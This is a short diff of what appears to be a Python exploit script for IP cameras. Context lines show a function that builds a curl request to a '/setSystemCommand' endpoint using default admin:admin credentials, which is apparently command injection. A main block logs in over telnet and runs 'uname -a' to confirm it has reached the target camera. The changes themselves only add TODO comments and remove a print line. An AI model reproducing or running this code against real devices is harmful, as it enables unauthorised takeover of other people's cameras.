@@ -5,6 +5,7 @@ import subprocess
 import telnetlib
 
 
+# TODO: change this to include IP + correct creds
 def curlInjection(ip):
     cmd = "curl 'http://" + ip + "/setSystemCommand' " \
                                  "--user admin:admin " \
@@ -50,8 +51,7 @@ if __name__ == '__main__':
                 tn.write(user + "\r\n")
                 tn.read_until("password: ")
                 tn.write(password + "\r\n")
-
+                # TODO: need to do stuff based on if we have the right one
                 # run uname to determine if we have the right camera
                 tn.write("uname -a \r\n")
                 ret1 = tn.read_eager()
-                print(ret1)  # or use however you want
